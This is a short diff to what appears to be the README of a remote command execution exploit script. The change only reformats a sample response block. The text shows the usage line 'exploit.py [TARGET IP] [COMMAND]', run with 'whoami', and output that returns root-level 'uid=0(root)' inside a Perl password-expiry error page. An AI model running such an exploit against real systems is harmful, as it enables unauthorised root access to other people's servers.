@@ -8,11 +8,8 @@ $ python3 exploit.py [TARGET IP] [COMMAND]
 $ python3 exploit.py 127.0.0.1 whoami
 
 ```
-&lt;h1&gt;Error - Perl execution failed&lt;/h1&gt;<br>
-&lt;p&gt;Your password has expired, and a new one must be chosen.<br>
-<strong>uid=0(root) gid=0(root) groups=0(root)</strong><br>
-&lt;/p&gt;
-```
+```bash
+#RESPONSE
 <h1>Error - Perl execution failed</h1>
 <p>Your password has expired, and a new one must be chosen.
 uid=0(root) gid=0(root) groups=0(root)
